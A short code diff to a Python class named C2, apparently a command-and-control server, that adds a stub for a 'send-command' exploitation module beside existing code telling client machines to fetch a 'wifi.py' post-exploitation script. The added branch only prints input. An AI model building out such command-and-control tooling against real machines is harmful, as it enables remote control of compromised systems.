@@ -123,6 +123,11 @@ class C2:
                 for uuid in uuids:
                     self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/wifi.py'})
 
+            if explotation_module_type == "send-command":
+                for uuid in uuids:
+                    print(data['input'])
+                    
+
 
 
             
